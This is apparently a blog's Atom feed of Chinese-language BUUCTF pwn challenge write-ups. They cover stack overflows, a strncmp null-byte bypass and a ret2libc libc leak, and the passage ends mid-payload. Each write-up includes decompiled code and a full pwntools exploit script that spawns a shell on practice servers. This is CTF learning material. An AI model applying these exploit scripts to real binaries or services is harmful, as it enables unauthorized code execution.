class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&quot;./get_started_3dsctf_2016&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27997</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># 0x0804E6A0为exit地址</span></span><br><span class="line">flag_addr=<span class="number">0x080489A0</span></span><br><span class="line">exit_addr=<span class="number">0x0804E6A0</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">56</span>+p32(flag_addr)+p32(exit_addr)</span><br><span class="line"><span class="comment">#后面俩个对应的是函数参数</span></span><br><span class="line">payload+=p32(<span class="number">0x308CD64F</span>)+p32(<span class="number">0x195719D1</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure><p>小结:</p><p>还有一种办法！等有时间的时候补充一下</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;get-started-3dsctf-2016&quot;&gt;&lt;a href=&quot;#get-started-3dsctf-2016&quot; class=&quot;headerlink&quot; title=&quot;get_started_3dsctf_2016&quot;&gt;&lt;/a&gt;get_started_3dsct</summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-jarvisoj_level2</title>
    <link href="http://example.com/2022/01/11/buuctf-jarvisoj-level2/"/>
    <id>http://example.com/2022/01/11/buuctf-jarvisoj-level2/</id>
    <published>2022-01-11T13:10:18.000Z</published>
    <updated>2022-01-11T13:10:54.806Z</updated>
    
    <content type="html"><![CDATA[<h1 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h1><p>正常逻辑看保护</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO#没开</span><br><span class="line">Stack:    No canary found#没开</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span><span class="meta">#w没开</span></span></span><br></pre></td></tr></table></figure><p>我们先去看主代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  system(<span class="string">&quot;echo &#x27;Hello World!&#x27;&quot;</span>); <span class="comment">//得到一个函数system函数的地址</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> vulnerable_function函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo Input:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);<span class="comment">//溢出漏洞</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路:溢出140个字符+system的函数地址+/bin/sh,/bin/sh查看ida字符串找到地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&quot;./level2&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28713</span>)</span><br><span class="line">system_plt=<span class="number">0x0804849E</span></span><br><span class="line">sh=<span class="number">0x0804A024</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">4</span>+p32(system_plt)+p32(sh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>总结:</p><p>我太那个了,我忘记了看保护了,就一上去做题了,搞的我一直泄漏libc.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;jarvisoj-level2&quot;&gt;&lt;a href=&quot;#jarvisoj-level2&quot; class=&quot;headerlink&quot; title=&quot;jarvisoj_level2&quot;&gt;&lt;/a&gt;jarvisoj_level2&lt;/h1&gt;&lt;p&gt;正常逻辑看保护&lt;/p&gt;
&lt;figur</summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-[OGeek2019]babyrop</title>
    <link href="http://example.com/2022/01/11/buuctf-OGeek2019-babyrop/"/>
    <id>http://example.com/2022/01/11/buuctf-OGeek2019-babyrop/</id>
    <published>2022-01-11T12:43:15.000Z</published>
    <updated>2022-01-11T12:47:48.714Z</updated>
    
    <content type="html"><![CDATA[<h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p>这题正常的来看是题目提示是ROP链</p><p>我们正常操作来看保护</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/king/下载/ctf/pwn/buu/[OGeek2019]babyrop/pwn&#x27;</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found #没开</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span>#没开</span></span><br></pre></td></tr></table></figure><p>下面我们看向伪代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_80486BB();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )<span class="comment">//如果大于0的时候进行下一步</span></span><br><span class="line">    read(fd, &amp;buf, <span class="number">4u</span>);<span class="comment">//输入的字符串</span></span><br><span class="line">  v2 = sub_804871F(buf);<span class="comment">//看看这个函数里面的内容</span></span><br><span class="line">  sub_80487D0(v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> /dev/random 一个特殊设备来提供随机数(详细的百度了解一下)，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_804871F</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+Ch] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">7</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v5; <span class="comment">// [esp+33h] [ebp-25h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">&quot;%ld&quot;</span>, a1);</span><br><span class="line">  v6 = read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);</span><br><span class="line">  buf[v6 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, &amp;s, v1) )<span class="comment">//其中buf为用户输入的值，&amp;s为buf随机数，如果不相等则会退出程序，所以需要想办法绕过这个判断，所以v1的值必须为0</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Correct\n&quot;</span>, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>printf</em>指的是字符串格式化命令，函数声明为 int <em>sprintf</em>(char *string, char *format [,argument,…]);，主要功能是把格式化的数据写入某个字符串中，即发送格式化输出到 string 所指向的字符串。</p><p>strlen函数,计算字符串 <strong>str</strong> 的长度，直到空结束字符，但不包括空结束字符。</p><p>strncmp函数 把 <strong>str1</strong> 和 <strong>str2</strong> 进行比较，最多比较前 <strong>n</strong> 个字节。</p><p>以上有个特征是strlen这个函数有个缺陷：遇到\x00直接截断。所以我们要输入第一位数为\x00</p><p>buf是一个7位数的数组，但函数中有v6 = read(0, buf, 0x20u);，从标准输入读取0x20个字节到buf，而v5恰好是buf的第8位，因此我们可以覆盖控制v5,0x20为28第7位为V5的值</p><p>下面我们就可以看到流程执行到下一个流程sub_80487D0(v2);最后一个函数里面有什么操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __cdecl <span class="title">sub_80487D0</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+11h] [ebp-E7h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">127</span> )<span class="comment">//我输入的a1=v5的值,假如a1等于127则会执行第一条语句，不会溢出，当a1大于0xE7时就会存在溢出，从而覆盖返回地址</span></span><br><span class="line">    result = read(<span class="number">0</span>, &amp;buf, <span class="number">0xC8</span>u);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = read(<span class="number">0</span>, &amp;buf, a1);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解题思路：首先通过\x00来绕过判断，覆盖v5为\xff（使得v5尽可能的大），通过wirte函数来泄露write的内存地址，然后利用libc来计算system函数地址，最后利用溢出使得返回地址为system</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;)</span></span><br><span class="line"></span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">rl=<span class="keyword">lambda</span> :io.recvline()</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node3.buuoj.cn&quot;,25190)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x8048825</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">system_libc=libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_libc=libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">write_libc=libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># write_plt = 0x08048578</span></span><br><span class="line"><span class="comment"># write_got = 0x08049FEC</span></span><br><span class="line"><span class="comment"># main_addr = 0x08048825</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">6</span>+ <span class="string">&#x27;\xff&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*(<span class="number">0xe7</span>+<span class="number">4</span>), write_plt, main_addr, <span class="number">1</span>, write_got, <span class="number">4</span>])</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(io.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;write_addr&#x27;</span>, <span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = LibcSearcher(&#x27;write&#x27;,write_addr)  </span></span><br><span class="line"><span class="comment"># libcbase = write_addr - libc.dump(&#x27;write&#x27;)  </span></span><br><span class="line"><span class="comment"># sys_add = libcbase + libc.dump(&quot;system&quot;)    </span></span><br><span class="line"><span class="comment"># binsh_add = libcbase + libc.dump(&quot;str_bin_sh&quot;) </span></span><br><span class="line"></span><br><span class="line">libcbase =  write_addr - write_libc</span><br><span class="line">sys_add = libcbase + system_libc</span><br><span class="line">binsh_add = libcbase + binsh_libc</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">6</span>+ <span class="string">&#x27;\xff&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*(<span class="number">0xe7</span>+<span class="number">4</span>), sys_add, <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>, binsh_add])</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;OGeek2019-babyrop&quot;&gt;&lt;a href=&quot;#OGeek2019-babyrop&quot; class=&quot;headerlink&quot; title=&quot;[OGeek2019]babyrop&quot;&gt;&lt;/a&gt;[OGeek2019]babyrop&lt;/h2&gt;&lt;p&gt;这题正常的来看是</summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-ciscn_2019_n_8</title>
    <link href="http://example.com/2022/01/09/buuctf-ciscn-2019-n-8/"/>
    <id>http://example.com/2022/01/09/buuctf-ciscn-2019-n-8/</id>
    <published>2022-01-09T09:43:43.000Z</published>
    <updated>2022-01-09T09:45:40.487Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h1><p>这题看保护:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO#没开</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>这题当时看保护全开我还以为很难</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp-14h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp-10h] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  var[<span class="number">13</span>] = <span class="number">0</span>;</span><br><span class="line">  var[<span class="number">14</span>] = <span class="number">0</span>;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, var, v4, v5); <span class="comment">//你输入的可控点只在var数组里面</span></span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)&amp;var[<span class="number">13</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)&amp;var[<span class="number">13</span>] == <span class="number">17LL</span> )<span class="comment">//主要是在这里var[13]=17就可以获取shell</span></span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;something wrong! val is %d&quot;</span>,</span><br><span class="line">        var[<span class="number">0</span>],</span><br><span class="line">        var[<span class="number">1</span>],</span><br><span class="line">        var[<span class="number">2</span>],</span><br><span class="line">        var[<span class="number">3</span>],</span><br><span class="line">        var[<span class="number">4</span>],</span><br><span class="line">        var[<span class="number">5</span>],</span><br><span class="line">        var[<span class="number">6</span>],</span><br><span class="line">        var[<span class="number">7</span>],</span><br><span class="line">        var[<span class="number">8</span>],</span><br><span class="line">        var[<span class="number">9</span>],</span><br><span class="line">        var[<span class="number">10</span>],</span><br><span class="line">        var[<span class="number">11</span>],</span><br><span class="line">        var[<span class="number">12</span>],</span><br><span class="line">        var[<span class="number">13</span>],</span><br><span class="line">        var[<span class="number">14</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s, Welcome!\n&quot;</span>, var);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try do something~&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那我们可以直接输入字符串到17位就可以了,但是pwntools的机制用法要熟悉,比如是32位是4个一个地址，64是8位一个地址.我输入到aaaaaa哪个知道是数组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27036</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">13</span> * <span class="number">4</span> + p32(<span class="number">17</span>)<span class="comment">#13*a*4,就是四位一个地址然后到13记住0也是</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>小结:</p><p>堆是真的难领悟！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ciscn-2019-n-8&quot;&gt;&lt;a href=&quot;#ciscn-2019-n-8&quot; class=&quot;headerlink&quot; title=&quot;ciscn_2019_n_8&quot;&gt;&lt;/a&gt;ciscn_2019_n_8&lt;/h1&gt;&lt;p&gt;这题看保护:&lt;/p&gt;
&lt;figure cla</summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>泄漏libc总结(1)32位</title>
    <link href="http://example.com/2021/11/28/%E6%B3%84%E6%BC%8Flibc%E6%80%BB%E7%BB%93-1-32%E4%BD%8D/"/>
    <id>http://example.com/2021/11/28/%E6%B3%84%E6%BC%8Flibc%E6%80%BB%E7%BB%93-1-32%E4%BD%8D/</id>
    <published>2021-11-28T12:36:38.000Z</published>
    <updated>2021-11-28T12:38:52.801Z</updated>
    
    <content type="html"><![CDATA[<h1 id="泄漏libc总结-1-32位"><a href="#泄漏libc总结-1-32位" class="headerlink" title="泄漏libc总结(1)32位"></a>泄漏libc总结(1)32位</h1><p>复习复习泄漏libc的几种方法，我将以pwn100-pwn200的方向来说一下！</p><h2 id="pwn200例题"><a href="#pwn200例题" class="headerlink" title="pwn200例题"></a>pwn200例题</h2><p>我们先讲pwn200(32)位的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+2Ch] [ebp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+30h] [ebp-68h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+34h] [ebp-64h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+38h] [ebp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+3Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+40h] [ebp-58h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+44h] [ebp-54h]</span></span><br><span class="line"></span><br><span class="line">  buf = <span class="string">&#x27;cleW&#x27;</span>;</span><br><span class="line">  v2 = <span class="string">&#x27; emo&#x27;</span>;</span><br><span class="line">  v3 = <span class="string">&#x27;X ot&#x27;</span>;</span><br><span class="line">  v4 = <span class="string">&#x27;FTCD&#x27;</span>;</span><br><span class="line">  v5 = <span class="string">&#x27;5102&#x27;</span>;</span><br><span class="line">  v6 = <span class="string">&#x27;\n!~&#x27;</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v7, <span class="number">0</span>, <span class="number">0x4C</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, (<span class="keyword">char</span> *)&amp;buf);</span><br><span class="line">  write(<span class="number">1</span>, &amp;buf, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf));</span><br><span class="line">  sub_8048484();#主要看这个函数里面的</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看向这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sub_8048484</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+1Ch] [ebp-6Ch]  #0x6c=108</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);#溢出 <span class="number">0x100</span>=<span class="number">256</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们这个时候没发现有其他函数比如cat flag和system的函数这个时候,我们就要从got表中找到system的got表的地址和/bin/sh的地址(俗称泄漏libc rop)</p><p>动态调试出他溢出到覆盖到ebp的位置,主要我这里太麻烦了就下次再说得到溢出+覆盖</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;a&#x27;</span>*<span class="number">0x6c</span>+<span class="string">&#x27;B&#x27;</span>*<span 